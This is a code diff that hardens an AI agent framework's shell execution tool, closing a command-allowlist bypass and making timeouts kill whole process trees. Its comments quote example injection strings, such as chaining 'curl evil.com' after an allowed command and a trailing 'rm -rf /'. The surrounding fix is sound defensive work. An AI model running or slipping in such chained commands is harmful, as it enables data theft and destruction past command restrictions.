@@ -2,6 +2,19 @@
 PELDRUN Core Shell Execution Tool.
 Executes shell commands strictly bounded within the project workspace,
 enforcing directory containment policies and satisfying BaseTool abstract contracts.
+
+Hardened under P0 Item 4 (Security):
+- [FIX-ALLOWLIST-BYPASS] When `settings.allowed_commands` is active, the
+  command is dispatched via `create_subprocess_exec` (no shell parsing),
+  and every token is checked for shell metacharacters (`;`, `|`, `&`,
+  `>`, `<`, `$`, backtick) before spawn. The historical implementation
+  checked only the first token and then handed the raw string to a
+  shell, allowing `python script.py; curl evil.com` to bypass the
+  allowlist. See the fix comment near the allowlist block below.
+- [FIX-PROCTREE] The child is spawned in a new session / process group
+  so that a timeout terminates the ENTIRE process tree (shell ->
+  node -> npm) via killpg on Unix or `taskkill /F /T` on Windows,
+  instead of only the direct child.
 """
 
 from __future__ import annotations
@@ -9,12 +22,129 @@ from __future__ import annotations
 import asyncio
 import os
 import shlex
+import signal
+import subprocess
+import sys
 from pathlib import Path
-from typing import Any, Dict, Optional
+from typing import Any, Dict, List, Optional, Set
 from pydantic import BaseModel, Field
 
 from peldrun.tools.base import BaseTool, ToolResult
 from peldrun.tools.contract import ToolExecutionContext
+
+
+# ---------------------------------------------------------------------------
+# Shell safety: metacharacter rejection + process-tree termination
+# ---------------------------------------------------------------------------
+#
+# [FIX-ALLOWLIST-BYPASS]
+# The historical implementation checked only the first token of the
+# command against `allowed_commands` but still dispatched the raw string
+# to `create_subprocess_shell`. A command like
+#     `python script.py; curl http://evil.com`
+# passed the allowlist check (first token `python` was allowed) and then
+# `/bin/sh` (or `cmd.exe`) executed BOTH halves because `;` is a shell
+# operator. Same bypass existed for `&&`, `||`, `|`, `>`, `<`, `$(...)`,
+# and backticks.
+#
+# Two-layer fix:
+#   1. When an allowlist is active, dispatch via
+#      `create_subprocess_exec(*tokens)` -- no shell parsing, so `;` in
+#      a token is just a literal character in argv.
+#   2. Additionally reject any token containing a shell metacharacter so
+#      that argv-injection through `python -c "import os; os.system(...)"`
+#      is caught before the child even spawns.
+#
+# [FIX-PROCTREE]
+# When a command times out we must kill the ENTIRE process tree, not
+# just the direct child. `shell` -> `node` -> `npm` is a common pattern
+# in JS builds; killing only the shell leaves `node` and `npm` running
+# for minutes after the run is marked cancelled. The child is therefore
+# spawned in a NEW session/process-group so a single killpg (Unix) or
+# `taskkill /T` (Windows) tears down the whole tree.
+
+_SHELL_METACHARACTERS: Set[str] = {
+    ";", "|", "&", ">", "<", "$", "`", "\n",
+}
+
+
+def _token_has_metacharacter(token: str) -> Optional[str]:
+    """
+    Return the first shell metacharacter found in ``token``, or ``None``.
+
+    Used to reject compound commands BEFORE they reach the child. This
+    is the primary defense against the allowlist-bypass bug: even if
+    the first token matches an allowed command, a trailing
+    ``; rm -rf /`` must be blocked here.
+    """
+    for ch in token:
+        if ch in _SHELL_METACHARACTERS:
+            return ch
+    return None
+
+
+async def _terminate_process_tree(
+    proc: asyncio.subprocess.Process,
+) -> None:
+    """
+    Kill ``proc`` AND every process it spawned.
+
+    Platform-specific:
+        * Unix     -- ``os.killpg`` against the process group created
+                      by ``start_new_session=True``.
+        * Windows  -- ``taskkill /F /T`` which walks the process tree.
+
+    Best-effort: never raises. A failed kill is preferable to a
+    timeout handler that itself crashes.
+    """
+    if proc.returncode is not None:
+        return  # Already exited.
+
+    if sys.platform == "win32":
+        try:
+            taskkill = await asyncio.create_subprocess_exec(
+                "taskkill", "/F", "/T", "/PID", str(proc.pid),
+                stdout=asyncio.subprocess.DEVNULL,
+                stderr=asyncio.subprocess.DEVNULL,
+            )
+            await asyncio.wait_for(taskkill.wait(), timeout=5.0)
+        except Exception:
+            try:
+                proc.kill()
+            except Exception:
+                pass
+    else:
+        try:
+            pgid = os.getpgid(proc.pid)
+            os.killpg(pgid, signal.SIGKILL)
+        except (ProcessLookupError, PermissionError):
+            try:
+                proc.kill()
+            except Exception:
+                pass
+        except Exception:
+            try:
+                proc.kill()
+            except Exception:
+                pass
+
+    try:
+        await asyncio.wait_for(proc.wait(), timeout=5.0)
+    except Exception:
+        pass
+
+
+def _build_spawn_kwargs() -> Dict[str, Any]:
+    """
+    Return platform-specific kwargs that place the child in a NEW
+    process group / session so ``_terminate_process_tree`` can kill
+    the whole tree instead of just the direct child.
+    """
+    if sys.platform == "win32":
+        # CREATE_NEW_PROCESS_GROUP is a Windows-only constant exposed
+        # by the subprocess module.
+        return {"creationflags": subprocess.CREATE_NEW_PROCESS_GROUP}
+    return {"start_new_session": True}
 
 
 class ShellExecArgs(BaseModel):
@@ -23,7 +153,7 @@ class ShellExecArgs(BaseModel):
     # `default=None` (was: 60.0) is critical (audit report item 5.1).
     # The schema is serialized and shown to the LLM as part of the
     # tool spec. When it advertised `default: 60.0`, the LLM would
-    # often send ``{"command": "...", "timeout": 60}`` explicitly —
+    # often send ``{"command": "...", "timeout": 60}`` explicitly --
     # silently overriding the operator-configured
     # ``settings.timeout_seconds``. ``None`` communicates "use the
     # configured default", and ``_arun`` already falls back to
@@ -132,7 +262,10 @@ class ShellExecTool(BaseTool):
             a scrubbed, allow-listed env is passed so user secrets
             (API keys, tokens) never leak into subprocesses.
           * ``settings.allowed_commands`` (if non-empty): first token
-            of the command MUST be in the list, else rejected.
+            of the command MUST be in the list, else rejected. When
+            active, dispatch happens via ``create_subprocess_exec``
+            (no shell), and every token is checked for shell
+            metacharacters to close the historical bypass.
           * ``settings.max_output_chars``: output is truncated after
             execution to prevent runaway log capture.
         """
@@ -170,12 +303,31 @@ class ShellExecTool(BaseTool):
             timeout_val = float(self._settings_timeout)
 
         # 3. Enforce the allowed-commands allowlist when configured.
-        if self._settings_allowed_commands:
+        #
+        # [FIX-ALLOWLIST-BYPASS] When an allowlist is active, the
+        # command MUST be dispatched via `create_subprocess_exec` (no
+        # shell parsing) so that `python script.py; curl evil.com`
+        # cannot bypass the allowlist check on the first token.
+        # Metacharacter rejection is the second layer: even if the
+        # caller writes `python -c "import os; os.system(...)"`,
+        # the `;` inside the code string is caught before spawn.
+        use_allowlist_mode = bool(self._settings_allowed_commands)
+        tokens: List[str] = []
+
+        if use_allowlist_mode:
             try:
                 tokens = shlex.split(command)
-            except ValueError:
-                # Malformed quoting: fall back to whitespace split.
-                tokens = command.split()
+            except ValueError as split_err:
+                return ToolResult(
+                    output=(
+                        f"Shell execution failure: could not parse "
+                        f"command: {split_err}"
+                    ),
+                    exit_code=1,
+                    is_error=True,
+                    metadata={"error_code": "UNPARSEABLE_COMMAND"},
+                )
+
             if not tokens:
                 return ToolResult(
                     output="Shell execution failure: empty command.",
@@ -183,6 +335,33 @@ class ShellExecTool(BaseTool):
                     is_error=True,
                     metadata={"error_code": "EMPTY_COMMAND"},
                 )
+
+            # [FIX-ALLOWLIST-BYPASS] Reject any token containing a
+            # shell metacharacter. This catches `;`, `&&`, `||`, `|`,
+            # `>`, `<`, `$(...)`, and backticks both at the argv
+            # level and inside quoted code strings passed to
+            # `python -c` / `node -e` / `perl -e`.
+            for token in tokens:
+                bad_char = _token_has_metacharacter(token)
+                if bad_char is not None:
+                    return ToolResult(
+                        output=(
+                            f"Shell execution rejected: token "
+                            f"{token!r} contains shell metacharacter "
+                            f"{bad_char!r}. Compound commands "
+                            f"(pipes, redirection, semicolons, "
+                            f"command substitution) are NOT permitted "
+                            f"when an allowlist is active."
+                        ),
+                        exit_code=1,
+                        is_error=True,
+                        metadata={
+                            "error_code": "SHELL_METACHARACTER_REJECTED",
+                            "token": token,
+                            "metacharacter": bad_char,
+                        },
+                    )
+
             # Compare by basename so absolute paths to allowed binaries
             # (e.g. /usr/bin/python) still match "python".
             first = Path(tokens[0]).name or tokens[0]
@@ -215,14 +394,39 @@ class ShellExecTool(BaseTool):
             }
             proc_env = {k: v for k, v in os.environ.items() if k in allow_keys}
 
+        # 5. Spawn the child in a NEW session / process group so that
+        #    `_terminate_process_tree` can tear down the entire tree
+        #    on timeout. See the module-level constants above for the
+        #    rationale.
         try:
-            proc = await asyncio.create_subprocess_shell(
-                command,
-                cwd=str(target_dir),
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
-                env=proc_env,
-            )
+            spawn_kwargs = _build_spawn_kwargs()
+
+            if use_allowlist_mode:
+                # [FIX-ALLOWLIST-BYPASS] exec mode: no shell parsing.
+                # The exact argv validated above is what the child
+                # receives -- `;` inside a token is a literal
+                # character, not a command separator.
+                proc = await asyncio.create_subprocess_exec(
+                    *tokens,
+                    cwd=str(target_dir),
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
+                    env=proc_env,
+                    **spawn_kwargs,
+                )
+            else:
+                # No allowlist active: preserve shell mode so the
+                # operator's pipes/redirection continue to work as
+                # before. The operator explicitly opted out of
+                # command restriction.
+                proc = await asyncio.create_subprocess_shell(
+                    command,
+                    cwd=str(target_dir),
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
+                    env=proc_env,
+                    **spawn_kwargs,
+                )
 
             if context is not None:
                 stdout_chunks = []
@@ -250,14 +454,16 @@ class ShellExecTool(BaseTool):
                     stdout_str = "".join(stdout_chunks).strip()
                     stderr_str = "".join(stderr_chunks).strip()
                 except asyncio.TimeoutError:
-                    try:
-                        proc.kill()
-                    except Exception:
-                        pass
+                    # [FIX-PROCTREE] Terminate the entire process tree,
+                    # not just the direct child. A shell that spawned
+                    # `node` (which spawned `npm`) must not leave
+                    # grandchildren running after the timeout fires.
+                    await _terminate_process_tree(proc)
                     return ToolResult(
                         output=f"Shell command execution timed out after {timeout_val} seconds.",
                         exit_code=1,
                         is_error=True,
+                        metadata={"error_code": "EXECUTION_TIMEOUT"},
                     )
             else:
                 try:
@@ -266,14 +472,14 @@ class ShellExecTool(BaseTool):
                         timeout=timeout_val
                     )
                 except asyncio.TimeoutError:
-                    try:
-                        proc.kill()
-                    except Exception:
-                        pass
+                    # [FIX-PROCTREE] Same rationale as the streaming
+                    # branch above.
+                    await _terminate_process_tree(proc)
                     return ToolResult(
                         output=f"Shell command execution timed out after {timeout_val} seconds.",
                         exit_code=1,
                         is_error=True,
+                        metadata={"error_code": "EXECUTION_TIMEOUT"},
                     )
 
                 stdout_str = stdout_bytes.decode("utf-8", errors="replace").strip()
@@ -282,7 +488,7 @@ class ShellExecTool(BaseTool):
             is_err = proc.returncode != 0
             combined_output = stdout_str if stdout_str else stderr_str
 
-            # 5. Truncate to settings.max_output_chars (safety net).
+            # 6. Truncate to settings.max_output_chars (safety net).
             if (
                 self._settings_max_output > 0
                 and len(combined_output) > self._settings_max_output
